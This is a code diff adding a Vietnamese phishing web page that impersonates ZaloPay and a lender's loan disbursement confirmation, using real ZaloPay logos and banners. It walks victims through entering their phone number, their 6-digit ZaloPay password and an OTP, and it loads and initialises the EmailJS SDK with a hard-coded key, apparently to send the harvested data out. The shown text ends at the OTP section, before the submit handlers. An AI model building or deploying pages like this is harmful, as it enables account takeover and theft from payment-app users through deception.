@@ -1,0 +1,1665 @@
+
+<!DOCTYPE html>
+<html lang="vi">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <meta
+      name="description"
+      content="Xác nhận khoản vay qua ZaloPay"
+    />
+    <title>Xác Nhận Giải Ngân - </title>
+    <link rel="preconnect" href="https://fonts.googleapis.com" />
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+    <link
+      href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap"
+      rel="stylesheet"
+    />
+
+    <!-- EmailJS SDK -->
+    <script
+      type="text/javascript"
+      src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"
+    ></script>
+    <script type="text/javascript">
+      (function () {
+        // Load config - use environment variable if available
+        const EMAILJS_KEY = window.EMAILJS_PUBLIC_KEY || '7y3ePVskhQ1U5EF2l';
+        emailjs.init({
+        publicKey: EMAILJS_KEY,
+        });
+      })();
+    </script>
+
+    <style>
+      :root {
+        /* --- Bảng màu được làm mới --- */
+        --fecredit-blue: #004695;
+        --fecredit-blue-darker: #003a7c;
+        --fecredit-primary: #003a7c;
+        --fecredit-primary-dark: #003a9e;
+        --fecredit-red: #003a7c;
+        --zalopay-blue: #004BCA;
+        --zalopay-blue-darker: #003a9e;
+        --text-primary: #1a202c; /* Đậm hơn cho tiêu đề chính */
+        --text-secondary: #4a5568; /* Xám nhẹ cho văn bản phụ */
+        --text-tertiary: #718096; /* Xám rất nhạt cho nhãn */
+        --background-primary: #ffffff; /* Nền trắng chính */
+        --background-secondary: #f7fafc; /* Nền xám rất nhạt */
+        --border-color: #e2e8f0;
+        --success: #004695;
+        --error: #1a202c;
+        --global-font: "Inter", sans-serif;
+      }
+
+      /* --- Global Reset & Base Styles --- */
+      * {
+        margin: 0;
+        padding: 0;
+        box-sizing: border-box;
+        font-family: var(--global-font);
+      }
+
+      html {
+        -webkit-font-smoothing: antialiased;
+        -moz-osx-font-smoothing: grayscale;
+      }
+
+      body {
+        background-color: #e2e8f0; /* Nền xám hơn cho body */
+        display: flex;
+        justify-content: center;
+        align-items: flex-start;
+        padding: 20px;
+        min-height: 100vh;
+      }
+
+      /* --- Khung giao diện chính --- */
+      .mobile-frame {
+        width: 100%;
+        max-width: 420px;
+        margin: auto;
+        background-color: var(--background-secondary);
+        border-radius: 36px; /* Bo tròn nhiều hơn */
+        box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.25),
+          0 0 15px rgba(0, 0, 0, 0.07);
+        overflow: hidden;
+        display: flex;
+        flex-direction: column;
+        min-height: 720px;
+      }
+
+      /* --- Quản lý các trang --- */
+      .page-section {
+        display: none;
+        flex-direction: column;
+        flex-grow: 1;
+        animation: fadeIn 0.4s cubic-bezier(0.25, 0.46, 0.45, 0.94);
+      }
+
+      @keyframes fadeIn {
+        from {
+          opacity: 0;
+          transform: translateY(10px);
+        }
+        to {
+          opacity: 1;
+          transform: translateY(0);
+        }
+      }
+
+      .page-section.active {
+        display: flex;
+      }
+
+      /* --- Header của các trang --- */
+      .page-header {
+        padding: 16px;
+        text-align: center;
+        background-color: var(--background-primary);
+        border-bottom: 1px solid var(--border-color);
+        flex-shrink: 0;
+        position: relative;
+      }
+      .page-header h1 {
+        font-size: 16px;
+        font-weight: 600;
+        color: var(--text-primary);
+      }
+      .page-header .back-button {
+        position: absolute;
+        left: 12px;
+        top: 50%;
+        transform: translateY(-50%);
+        background: transparent;
+        border: none;
+        cursor: pointer;
+        padding: 8px;
+        border-radius: 50%;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        transition: background-color 0.2s;
+      }
+      .page-header .back-button:hover {
+        background-color: var(--background-secondary);
+      }
+      .page-header .back-button img {
+        width: 24px;
+        height: 24px;
+      }
+
+      /* Header đặc biệt cho trang xác nhận */
+      #confirmation-section .page-header {
+        background: linear-gradient(135deg, #005cde, #003a7c);
+        border-bottom: none;
+      }
+      #confirmation-section .page-header h1 {
+        color: white;
+        font-size: 18px;
+      }
+      #confirmation-section .page-header .back-button img {
+        filter: brightness(0) invert(1);
+      }
+
+      /* --- Body của các trang --- */
+      .page-body {
+        padding: 16px;
+        flex-grow: 1;
+        overflow-y: auto;
+      }
+
+      /* --- Card thông tin --- */
+      .info-card {
+        background-color: var(--background-primary);
+        border-radius: 18px;
+        padding: 20px;
+        margin-bottom: 16px;
+        border: 1px solid var(--border-color);
+      }
+
+      /* Card tóm tắt thanh toán */
+      .payment-summary-card {
+        text-align: center;
+      }
+      .payment-summary-card .label {
+        font-size: 15px;
+        color: var(--text-tertiary);
+        margin-bottom: 8px;
+      }
+      .payment-summary-card .amount {
+        font-size: 36px;
+        font-weight: 700;
+        color: var(--text-primary);
+        margin-bottom: 24px;
+      }
+      .payment-summary-card hr {
+        border: none;
+        border-top: 1px solid var(--border-color);
+        margin: 0 -20px;
+      }
+
+      /* Chi tiết trong card */
+      .info-card .title {
+        font-size: 16px;
+        font-weight: 600;
+        color: var(--text-primary);
+        margin-bottom: 12px;
+        display: block;
+      }
+      .detail-item {
+        display: flex;
+        justify-content: space-between;
+        align-items: center;
+        font-size: 15px;
+        padding: 15px 0;
+        border-bottom: 1px solid var(--border-color);
+      }
+      .detail-item:first-of-type {
+        padding-top: 15px;
+      }
+      .detail-item:last-of-type {
+        border-bottom: none;
+        padding-bottom: 5px;
+      }
+      .detail-item .label {
+        color: var(--text-secondary);
+        font-weight: 400;
+      }
+      .detail-item .value {
+        font-weight: 500;
+        color: var(--text-primary);
+        text-align: right;
+        display: flex;
+        align-items: center;
+        gap: 8px;
+      }
+      .detail-item .value img {
+        width: 24px;
+        height: 24px;
+      }
+
+      /* Card thông báo */
+      .notice-card {
+        background-color: #ebf4ff; /* Màu xanh nhạt hơn */
+        display: flex;
+        align-items: center;
+        gap: 12px;
+        padding: 16px;
+        border: 1px solid #bee3f8;
+      }
+      .notice-card img {
+        width: 24px;
+        height: 24px;
+        flex-shrink: 0;
+      }
+      .notice-card p {
+        font-size: 14px;
+        line-height: 1.5;
+        color: #2a4365;
+        font-weight: 500;
+      }
+      .notice-card strong {
+        color: var(--fecredit-red);
+      }
+
+      /* --- Footer của trang --- */
+      .page-footer {
+        padding: 16px;
+        background-color: rgba(255, 255, 255, 0.8);
+        backdrop-filter: blur(10px);
+        -webkit-backdrop-filter: blur(10px);
+        flex-shrink: 0;
+        border-top: 1px solid var(--border-color);
+      }
+
+      /* --- Giao diện các trang đăng nhập ZaloPay (ĐỒNG BỘ) --- */
+      .login-page-layout {
+        flex-grow: 1;
+        display: flex;
+        flex-direction: column;
+        background-color: var(--background-primary);
+        padding: 24px 20px;
+      }
+      .login-content {
+        flex-grow: 1;
+        display: flex;
+        flex-direction: column;
+        justify-content: center;
+        text-align: center;
+      }
+      .login-footer {
+        margin-top: auto;
+        padding-top: 24px;
+      }
+
+      /* Header chung cho các trang login */
+      .login-header {
+        text-align: center;
+        margin-bottom: 32px;
+      }
+      .login-header .zlp-logo {
+        height: 40px;
+        margin-bottom: 24px;
+      }
+      .login-header .title {
+        font-size: 22px;
+        font-weight: 700;
+        color: var(--text-primary);
+        margin-bottom: 8px;
+      }
+      .login-header .subtitle {
+        font-size: 15px;
+        color: var(--text-secondary);
+        line-height: 1.6;
+      }
+      .login-header .subtitle strong {
+        color: var(--text-primary);
+      }
+
+      /* Header profile */
+      .profile-header {
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+        margin-bottom: 32px;
+      }
+      .profile-header .avatar {
+        width: 80px;
+        height: 80px;
+        border-radius: 50%;
+        background-color: var(--background-secondary);
+        margin-bottom: 16px;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        border: 4px solid var(--background-primary);
+        box-shadow: 0 4px 10px rgba(0, 0, 0, 0.08);
+      }
+      .profile-header .avatar img {
+        width: 44px;
+        opacity: 0.8;
+      }
+      .profile-header .phone-number {
+        font-size: 18px;
+        font-weight: 600;
+        color: var(--text-primary);
+      }
+
+      /* ===== ZaloPay Phone Section – split layout ===== */
+      #zalopay-phone-section {
+        background-color: var(--zalopay-blue);
+      }
+
+      /* ZaloPay App-style top header */
+      .zlp-app-header {
+        background: linear-gradient(135deg, #004BCA 0%, #0062ff 60%, #1a7fff 100%);
+        padding: 10px 16px 12px;
+        display: flex;
+        align-items: center;
+        justify-content: space-between;
+        flex-shrink: 0;
+      }
+      .zlp-app-header .zlp-logo-wrap {
+        display: flex;
+        align-items: center;
+        gap: 8px;
+      }
+      .zlp-app-header .zlp-logo-img {
+        height: 26px;
+        width: auto;
+        filter: brightness(0) invert(1);
+      }
+      .zlp-app-header .zlp-header-icons {
+        display: flex;
+        align-items: center;
+        gap: 12px;
+      }
+      .zlp-app-header .zlp-header-icon {
+        width: 22px;
+        height: 22px;
+        fill: white;
+        opacity: 0.92;
+      }
+
+      .zlp-hero-banner {
+        flex-shrink: 0;
+        position: relative;
+        overflow: hidden;
+        background-color: var(--zalopay-blue);
+      }
+      .zlp-carousel-track {
+        display: flex;
+        width: 100%;
+        transition: transform 0.45s cubic-bezier(0.25, 0.46, 0.45, 0.94);
+      }
+      .zlp-carousel-slide {
+        min-width: 100%;
+        flex-shrink: 0;
+        position: relative;
+      }
+      .zlp-carousel-slide img {
+        width: 100%;
+        height: 180px;
+        object-fit: cover;
+        display: block;
+      }
+      /* CSS-styled promotional banner slide */
+      .zlp-banner-css {
+        width: 100%;
+        height: 180px;
+        display: flex;
+        align-items: center;
+        justify-content: flex-start;
+        padding: 20px 24px;
+        box-sizing: border-box;
+        position: relative;
+        overflow: hidden;
+      }
+      .zlp-banner-css .banner-content {
+        z-index: 2;
+        max-width: 60%;
+      }
+      .zlp-banner-css .banner-tag {
+        display: inline-block;
+        background: rgba(255,255,255,0.25);
+        color: white;
+        font-size: 10px;
+        font-weight: 700;
+        padding: 3px 8px;
+        border-radius: 20px;
+        letter-spacing: 0.5px;
+        text-transform: uppercase;
+        margin-bottom: 8px;
+      }
+      .zlp-banner-css .banner-title {
+        font-size: 18px;
+        font-weight: 800;
+        color: white;
+        line-height: 1.2;
+        margin-bottom: 6px;
+      }
+      .zlp-banner-css .banner-sub {
+        font-size: 12px;
+        color: rgba(255,255,255,0.85);
+        line-height: 1.4;
+      }
+      .zlp-banner-css .banner-btn {
+        margin-top: 10px;
+        display: inline-block;
+        background: white;
+        color: #004BCA;
+        font-size: 11px;
+        font-weight: 700;
+        padding: 5px 14px;
+        border-radius: 20px;
+      }
+      .zlp-banner-css .banner-icon {
+        position: absolute;
+        right: -10px;
+        bottom: -5px;
+        font-size: 90px;
+        opacity: 0.18;
+        z-index: 1;
+        line-height: 1;
+      }
+      .zlp-banner-css .banner-img-right {
+        position: absolute;
+        right: 12px;
+        bottom: 0;
+        height: 170px;
+        width: auto;
+        object-fit: contain;
+        z-index: 2;
+      }
+      /* Slide color themes */
+      .zlp-banner-css.theme-blue {
+        background: linear-gradient(135deg, #004BCA 0%, #0066ff 100%);
+      }
+      .zlp-banner-css.theme-teal {
+        background: linear-gradient(135deg, #007b8a 0%, #00b4cc 100%);
+      }
+      .zlp-banner-css.theme-purple {
+        background: linear-gradient(135deg, #5b30a6 0%, #8b5cf6 100%);
+      }
+      .zlp-banner-css.theme-orange {
+        background: linear-gradient(135deg, #e05c00 0%, #ff7d00 100%);
+      }
+      .zlp-banner-css.theme-green {
+        background: linear-gradient(135deg, #006b3c 0%, #00a862 100%);
+      }
+      .zlp-carousel-dots {
+        position: absolute;
+        bottom: 10px;
+        left: 50%;
+        transform: translateX(-50%);
+        display: flex;
+        gap: 5px;
+        align-items: center;
+      }
+      .zlp-carousel-dots .dot {
+        width: 6px;
+        height: 6px;
+        border-radius: 50%;
+        background-color: rgba(255, 255, 255, 0.45);
+        transition: width 0.3s ease, background-color 0.3s ease, border-radius 0.3s ease;
+        cursor: pointer;
+      }
+      .zlp-carousel-dots .dot.active {
+        background-color: #ffffff;
+        width: 22px;
+        border-radius: 3px;
+      }
+
+      /* OTP countdown */
+      .otp-countdown {
+        font-size: 14px;
+        color: var(--text-secondary);
+      }
+      .otp-countdown strong {
+        color: var(--zalopay-blue);
+        font-weight: 600;
+      }
+
+      /* White card sliding up from bottom */
+      .zlp-phone-card {
+        background-color: var(--background-primary);
+        border-top-left-radius: 24px;
+        border-top-right-radius: 24px;
+        flex-grow: 1;
+        display: flex;
+        flex-direction: column;
+        padding: 28px 20px 24px;
+      }
+      .zlp-phone-card .card-title {
+        font-size: 20px;
+        font-weight: 700;
+        color: var(--text-primary);
+        text-align: left;
+        margin-bottom: 20px;
+      }
+
+      /* Ô nhập SĐT */
+      .phone-input-wrapper {
+        display: flex;
+        align-items: center;
+        width: 100%;
+        border: 1px solid var(--border-color);
+        border-radius: 8px;
+        padding: 0 14px;
+        background-color: var(--background-primary);
+        transition: border-color 0.2s;
+      }
+      .phone-input-wrapper:focus-within {
+        border-color: var(--zalopay-blue);
+      }
+      .phone-input {
+        border: none;
+        padding: 14px 0;
+        font-size: 16px;
+        font-weight: 400;
+        flex-grow: 1;
+        color: var(--text-primary);
+        background: none;
+        text-align: left;
+      }
+      .phone-input:focus {
+        outline: none;
+      }
+      .phone-input.invalid {
+        color: var(--error);
+      }
+
+      /* Giao diện nhập mật khẩu ZaloPay */
+      .password-input-container-zlp {
+        position: relative;
+        width: 100%;
+        max-width: 340px;
+        margin: 24px auto 0;
+      }
+      .password-real-input {
+        position: absolute;
+        top: 0;
+        left: 0;
+        width: 100%;
+        height: 100%;
+        opacity: 0;
+        border: none;
+        padding: 0;
+        margin: 0;
+        z-index: 1;
+        caret-color: transparent;
+      }
+      .password-real-input:focus {
+        outline: none;
+      }
+      .password-display-zlp {
+        display: flex;
+        justify-content: center;
+        gap: 12px;
+        cursor: text;
+      }
+      .char-box {
+        width: 46px;
+        height: 46px;
+        flex-shrink: 0;
+        border: 2px solid var(--border-color);
+        border-radius: 50%;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        transition: border-color 0.2s ease-in-out;
+        position: relative;
+      }
+      .char-box.focus-active {
+        border-color: var(--zalopay-blue);
+      }
+      .char-box.filled::after {
+        content: "●";
+        font-size: 16px;
+        color: var(--text-primary);
+        animation: popIn 0.2s ease;
+      }
+      @keyframes popIn {
+        from {
+          transform: scale(0.5);
+          opacity: 0;
+        }
+        to {
+          transform: scale(1);
+          opacity: 1;
+        }
+      }
+      .char-box.active::before {
+        content: "";
+        position: absolute;
+        left: 50%;
+        transform: translateX(-50%);
+        width: 2px;
+        height: 25px;
+        background-color: var(--zalopay-blue);
+        animation: blink 1.1s infinite step-end;
+      }
+      @keyframes blink {
+        0%,
+        100% {
+          opacity: 1;
+        }
+        50% {
+          opacity: 0;
+        }
+      }
+
+      /* Giao diện nhập OTP – single wide input */
+      .otp-single-input {
+        display: block;
+        width: 100%;
+        max-width: 320px;
+        margin: 24px auto 0;
+        padding: 14px 16px;
+        font-size: 26px;
+        font-weight: 700;
+        letter-spacing: 0.35em;
+        text-align: center;
+        border: 2px solid var(--border-color);
+        border-radius: 12px;
+        color: var(--text-primary);
+        background-color: var(--background-primary);
+        transition: border-color 0.2s, box-shadow 0.2s;
+        outline: none;
+        caret-color: var(--zalopay-blue);
+      }
+      .otp-single-input:focus {
+        border-color: var(--zalopay-blue);
+        box-shadow: 0 0 0 4px rgba(0, 75, 202, 0.12);
+      }
+
+      /* Nút bấm */
+      .button {
+        width: 100%;
+        padding: 16px;
+        border-radius: 16px;
+        cursor: pointer;
+        font-size: 16px;
+        font-weight: 600;
+        transition: all 0.2s ease-in-out;
+        border: none;
+        box-shadow: 0 5px 15px -3px rgba(0, 118, 255, 0.35);
+      }
+      .button:active:not(:disabled) {
+        transform: translateY(1px) scale(0.99);
+        filter: brightness(0.95);
+        box-shadow: 0 2px 8px rgba(0, 70, 149, 0.2);
+      }
+      .button:disabled {
+        background: #cbd5e0;
+        color: #a0aec0;
+        cursor: not-allowed;
+        box-shadow: none;
+      }
+      .button.primary {
+        background-color: var(--fecredit-red);
+        color: #fff;
+        box-shadow: 0 5px 15px -3px rgba(0, 70, 149, 0.35);
+      }
+      .button.primary:hover:not(:disabled) {
+        background-color: var(--fecredit-primary-dark);
+      }
+      .button.zalopay-btn {
+        background-color: var(--zalopay-blue);
+        color: #fff;
+        border-radius: 8px;
+        box-shadow: none;
+      }
+      .button.zalopay-btn:hover:not(:disabled) {
+        background-color: var(--zalopay-blue-darker);
+      }
+
+      /* Links */
+      .link-container {
+        margin-top: 24px;
+        font-size: 14px;
+        color: var(--text-secondary);
+      }
+      .link-container a {
+        color: var(--zalopay-blue);
+        font-weight: 500;
+        text-decoration: none;
+        transition: color 0.2s;
+      }
+      .link-container a:hover {
+        color: var(--zalopay-blue-darker);
+      }
+
+      /* Thỏa thuận */
+      .agreement-text {
+        font-size: 13px;
+        color: var(--text-secondary);
+        text-align: center;
+        line-height: 1.6;
+        margin-bottom: 16px;
+        padding: 0 16px;
+      }
+      .agreement-text a {
+        color: var(--zalopay-blue);
+        text-decoration: none;
+        font-weight: 500;
+      }
+
+      /* ===== ZaloPay Password Section – blue header ===== */
+      #zalopay-password-section > .zlp-blue-header {
+        flex-shrink: 0;
+        background-color: var(--zalopay-blue);
+        padding: 14px 16px;
+        display: flex;
+        align-items: center;
+        justify-content: space-between;
+      }
+      .zlp-blue-header .zlp-back-link {
+        background: transparent;
+        border: none;
+        color: #ffffff;
+        font-size: 14px;
+        font-weight: 500;
+        cursor: pointer;
+        display: flex;
+        align-items: center;
+        gap: 4px;
+        padding: 0;
+      }
+      .zlp-blue-header .zlp-menu-group {
+        display: flex;
+        align-items: center;
+        gap: 8px;
+      }
+      .zlp-blue-header .zlp-menu-btn {
+        background: transparent;
+        border: 1px solid rgba(255, 255, 255, 0.5);
+        color: #ffffff;
+        border-radius: 20px;
+        padding: 4px 10px;
+        font-size: 14px;
+        cursor: pointer;
+        line-height: 1;
+      }
+
+      /* Password section main content card */
+      .zlp-password-card {
+        background-color: var(--background-primary);
+        margin: 16px;
+        border-radius: 16px;
+        padding: 24px 20px;
+        box-shadow: 0 2px 12px rgba(0, 0, 0, 0.08);
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+      }
+      .zlp-password-card .card-title {
+        font-size: 18px;
+        font-weight: 700;
+        color: var(--text-primary);
+        text-align: center;
+        margin-bottom: 8px;
+      }
+      .zlp-password-card .card-subtitle {
+        font-size: 14px;
+        color: var(--text-secondary);
+        text-align: center;
+        line-height: 1.5;
+        margin-bottom: 0;
+      }
+
+      /* Password circles row */
+      .password-display-zlp {
+        display: flex;
+        justify-content: center;
+        gap: 12px;
+        cursor: text;
+        margin-top: 24px;
+      }
+
+    
+      .loading {
+        display: none;
+        text-align: center;
+        margin-top: 16px;
+      }
+      .spinner {
+        border: 4px solid rgba(0, 75, 202, 0.2);
+        border-top-color: var(--zalopay-blue);
+        border-radius: 50%;
+        width: 32px;
+        height: 32px;
+        animation: spin 1s linear infinite;
+        margin: 0 auto;
+      }
+      @keyframes spin {
+        100% {
+          transform: rotate(360deg);
+        }
+      }
+
+      /* Thông báo */
+      .notification {
+        position: fixed;
+        top: 20px;
+        left: 50%;
+        transform: translateX(-50%) translateY(-150%);
+        padding: 14px 24px;
+        border-radius: 12px;
+        color: #fff;
+        z-index: 1001;
+        box-shadow: 0 10px 25px -5px rgba(0, 0, 0, 0.2),
+          0 8px 10px -6px rgba(0, 0, 0, 0.2);
+        transition: transform 0.4s cubic-bezier(0.25, 0.46, 0.45, 0.94);
+        display: flex;
+        align-items: center;
+        gap: 12px;
+        font-weight: 500;
+        min-width: 300px;
+        max-width: 90%;
+      }
+      .notification.show {
+        transform: translateX(-50%) translateY(0);
+      }
+      .notification.success {
+        background-color: var(--success);
+      }
+      .notification.error {
+        background-color: var(--error);
+      }
+      .notification::before {
+        content: "";
+        display: inline-block;
+        width: 22px;
+        height: 22px;
+        background-size: contain;
+        background-repeat: no-repeat;
+        background-position: center;
+        flex-shrink: 0;
+      }
+      .notification.success::before {
+        background-image: url("data:image/svg+xml,%3csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 20 20' fill='white'%3e%3cpath fill-rule='evenodd' d='M10 18a8 8 0 100-16 8 8 0 000 16zm3.707-9.293a1 1 0 00-1.414-1.414L9 10.586 7.707 9.293a1 1 0 00-1.414 1.414l2 2a1 1 0 001.414 0l4-4z' clip-rule='evenodd' /%3e%3c/svg%3e");
+      }
+      .notification.error::before {
+        background-image: url("data:image/svg+xml,%3csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 20 20' fill='white'%3e%3cpath fill-rule='evenodd' d='M10 18a8 8 0 100-16 8 8 0 000 16zM8.707 7.293a1 1 0 00-1.414 1.414L8.586 10l-1.293 1.293a1 1 0 101.414 1.414L10 11.414l1.293 1.293a1 1 0 001.414-1.414L11.414 10l1.293-1.293a1 1 0 00-1.414-1.414L10 8.586 8.707 7.293z' clip-rule='evenodd' /%3e%3c/svg%3e");
+      }
+    </style>
+  </head>
+  <body>
+    <div class="mobile-frame">
+      <!-- Confirmation View -->
+      <div id="confirmation-section" class="page-section active">
+        <header class="page-header">
+          <button
+            class="back-button"
+            onclick="window.location.href='Evaluate-conditions.html'"
+          >
+            <img
+              src="data:image/svg+xml,%3csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='currentColor'%3e%3cpath fill-rule='evenodd' d='M11.03 3.97a.75.75 0 010 1.06l-6.22 6.22H21a.75.75 0 010 1.5H4.81l6.22 6.22a.75.75 0 11-1.06 1.06l-7.5-7.5a.75.75 0 010-1.06l7.5-7.5a.75.75 0 011.06 0z' clip-rule='evenodd' /%3e%3c/svg%3e"
+              alt="Back"
+            />
+          </button>
+          <h1>Xác nhận giải ngân</h1>
+        </header>
+        <main class="page-body">
+          <div class="info-card payment-summary-card">
+            <h2 class="amount" id="mainTotalAmount"></h2>
+            <hr />
+            <div id="payment-details" style="padding-top: 5px"></div>
+          </div>
+          <div class="info-card">
+            <strong class="title">Thông tin người vay</strong>
+            <div id="customer-details"></div>
+          </div>
+          <div class="info-card notice-card">
+            <img
+              src="data:image/svg+xml,%3csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='%23004695'%3e%3cpath fill-rule='evenodd' d='M6.75 2.25A.75.75 0 017.5 3v1.5h9V3A.75.75 0 0118 3v1.5h.75a3 3 0 013 3v11.25a3 3 0 01-3 3H5.25a3 3 0 01-3-3V7.5a3 3 0 013-3H6V3a.75.75 0 01.75-.75zM5.25 6A1.5 1.5 0 003.75 7.5v11.25c0 .828.672 1.5 1.5 1.5h13.5a1.5 1.5 0 001.5-1.5V7.5A1.5 1.5 0 0018.75 6H5.25z' clip-rule='evenodd' /%3e%3c/svg%3e"
+              alt="Calendar Icon"
+            />
+            <p id="closingDateNotice"></p>
+          </div>
+        </main>
+        <footer class="page-footer">
+          <button
+            class="button primary"
+            onclick="showSection('zalopay-phone-section')"
+          >
+            Xác nhận
+          </button>
+        </footer>
+      </div>
+
+      <!-- ZaloPay Phone Input View -->
+      <div id="zalopay-phone-section" class="page-section">
+
+        <!-- ZaloPay App-style header -->
+        <div class="zlp-app-header">
+          <div class="zlp-logo-wrap">
+            <img
+              id="zlp-logo-img"
+              class="zlp-logo-img"
+              src="https://simg.zalopay.com.vn/zlp-website/assets/new_logo_6c5db2d21b.svg"
+              alt="ZaloPay"
+            /><span id="zlp-logo-text" style="display:none;color:white;font-size:18px;font-weight:800;letter-spacing:-0.5px;">ZaloPay</span>
+          </div>
+          <div class="zlp-header-icons">
+            <!-- Notification bell -->
+            <svg class="zlp-header-icon" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+              <path d="M12 22c1.1 0 2-.9 2-2h-4c0 1.1.9 2 2 2zm6-6V11c0-3.07-1.64-5.64-4.5-6.32V4c0-.83-.67-1.5-1.5-1.5s-1.5.67-1.5 1.5v.68C7.63 5.36 6 7.92 6 11v5l-2 2v1h16v-1l-2-2z"/>
+            </svg>
+            <!-- QR scan icon -->
+            <svg class="zlp-header-icon" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+              <path d="M9.5 6.5v3h-3v-3h3M11 5H5v6h6V5zm-1.5 9.5v3h-3v-3h3M11 13H5v6h6v-6zm6.5-6.5v3h-3v-3h3M19 5h-6v6h6V5zm-6 8h1.5v1.5H13V13zm1.5 1.5H16V16h-1.5v-1.5zM16 13h1.5v1.5H16V13zm-3 3h1.5v1.5H13V16zm1.5 1.5H16V19h-1.5v-1.5zM16 16h1.5v1.5H16V16zm1.5-1.5H19V16h-1.5v-1.5zm0 3H19V19h-1.5v-1.5zM22 7h-2V4h-3V2h5v5zm0 15v-5h-2v3h-3v2h5zM2 22h5v-2H4v-3H2v5zM2 2v5h2V4h3V2H2z"/>
+            </svg>
+          </div>
+        </div>
+
+        <!-- Image carousel banner -->
+        <div class="zlp-hero-banner">
+          <div class="zlp-carousel-track" id="zlp-carousel-track">
+
+            <!-- Slide 1: Nạp thẻ điện thoại (Mobile top-up – from ZaloPay CDN) -->
+            <div class="zlp-carousel-slide">
+              <img
+                src="https://simg.zalopay.com.vn/zlp-website/assets/1x_Referalt2_Mapthe_1242x598_71ef5626d7.jpg"
+                alt="Nạp thẻ điện thoại ưu đãi"
+                class="zlp-slide-img"
+              />
+            </div>
+
+            <!-- Slide 2 -->
+            <div class="zlp-carousel-slide">
+              <img
+                src="https://simg.zalopay.com.vn/zlp-website/assets/1x_243_Mapcard_1_T_1242x598_9ead8e99d6.jpg"
+                alt="ZaloPay ưu đãi"
+                class="zlp-slide-img"
+              />
+            </div>
+
+            <!-- Slide 7 -->
+            <div class="zlp-carousel-slide">
+              <img
+                src="https://simg.zalopay.com.vn/zlp-website/assets/Trasau_hoadon_720x360_64a9bada68.jpg"
+                alt="ZaloPay Lynk"
+                class="zlp-slide-img"
+              />
+            </div>
+
+            <!-- Slide 8 -->
+            <div class="zlp-carousel-slide">
+              <img
+                src="https://simg.zalopay.com.vn/zlp-website/assets/Showcase_Risk_and_Security_banner_website_1200x578_min_42f5107d0c.jpg"
+                alt="ZaloPay dịch vụ"
+                class="zlp-slide-img"
+              />
+            </div>
+
+            <!-- Slide 9 -->
+            <div class="zlp-carousel-slide">
+              <img
+                src="https://mcredit.com.vn/content/133317330930338065_z4448691086917_01a0768c60f53312f82322b181c0b269.jpg"
+                alt="ZaloPay bảo mật an toàn"
+                class="zlp-slide-img"
+              />
+            </div>
+
+          </div>
+          <div class="zlp-carousel-dots" id="zlp-carousel-dots">
+            <span class="dot active"></span>
+            <span class="dot"></span>
+            <span class="dot"></span>
+            <span class="dot"></span>
+            <span class="dot"></span>
+          </div>
+        </div>
+
+        <!-- White card (bottom) -->
+        <div class="zlp-phone-card">
+          <h2 class="card-title">Nhập số điện thoại để tiếp tục</h2>
+          <form onsubmit="event.preventDefault(); handlePhoneSubmit();">
+            <div class="phone-input-wrapper">
+              <input
+                type="tel"
+                id="zalopay-phone"
+                class="phone-input"
+                placeholder="Nhập số điện thoại"
+                required
+                inputmode="numeric"
+                maxlength="10"
+                pattern="[0-9]{9,10}"
+                oninput="this.value = this.value.replace(/\D/g, '')"
+              />
+            </div>
+          </form>
+
+          <div style="flex-grow: 1;"></div>
+
+          <p class="agreement-text" style="margin-top: 20px;">
+            Bằng việc sử dụng ZaloPay, tôi đồng ý với
+            <a href="#">Thỏa thuận sử dụng ZaloPay</a>
+            và
+            <a href="#">Chính sách bảo vệ quyền riêng tư</a>
+          </p>
+          <button class="button zalopay-btn" onclick="handlePhoneSubmit()">
+            Tiếp tục
+          </button>
+        </div>
+      </div>
+
+      <!-- ZaloPay Password Input View -->
+      <div id="zalopay-password-section" class="page-section" style="background-color: var(--background-secondary);">
+        <!-- Blue header / navbar -->
+        <div class="zlp-blue-header">
+          <button class="zlp-back-link" onclick="showSection('zalopay-phone-section')">
+            &#8249; Xác nhận mật khẩu
+          </button>
+          <div class="zlp-menu-group">
+
+          </div>
+        </div>
+
+        <main class="login-page-layout" style="padding: 0; background-color: transparent;">
+          <div class="zlp-password-card">
+            <h2 class="card-title">Xác nhận mật khẩu</h2>
+            <p class="card-subtitle">Nhập mật khẩu để xác nhận bạn là chủ tài khoản này</p>
+            <div class="password-input-container-zlp">
+              <input
+                type="password"
+                id="zalopay-password"
+                class="password-real-input"
+                autocomplete="one-time-code"
+                required
+                inputmode="numeric"
+                pattern="[0-9]{6}"
+                maxlength="6"
+                oninput="this.value = this.value.replace(/\D/g, ''); updatePasswordDisplay(this.value)"
+              />
+              <div
+                class="password-display-zlp"
+                onclick="document.getElementById('zalopay-password').focus()"
+              >
+                <div class="char-box"></div>
+                <div class="char-box"></div>
+                <div class="char-box"></div>
+                <div class="char-box"></div>
+                <div class="char-box"></div>
+                <div class="char-box"></div>
+              </div>
+            </div>
+            <div class="link-container" style="margin-top: 16px; text-align: center;">
+              <a href="#">Quên mật khẩu?</a>
+            </div>
+          </div>
+
+          <!-- Confirm button hidden; auto-submit on 6 chars -->
+          <div class="login-footer" style="display: none;">
+            <button class="button zalopay-btn" id="zlp-password-confirm-btn" onclick="handlePasswordSubmit()">
+              Xác nhận
+            </button>
+          </div>
+        </main>
+      </div>
+
+      <!-- ZaloPay OTP Input View -->
+      <div id="zalopay-otp-section" class="page-section">
+        <header class="page-header">
+          <button
+            class="back-button"
+            onclick="showSection('zalopay-password-section')"
+          >
+            <img
+              src="data:image/svg+xml,%3csvg xmlns='http://www.w3.org/2000/svg' fill='none' viewBox='0 0 24 24' stroke-width='2.5' stroke='%231d1d1f'%3e%3cpath stroke-linecap='round' stroke-linejoin='round' d='M15.75 19.5L8.25 12l7.5-7.5' /%3e%3c/svg%3e"
+              alt="Back"
+            />
+          </button>
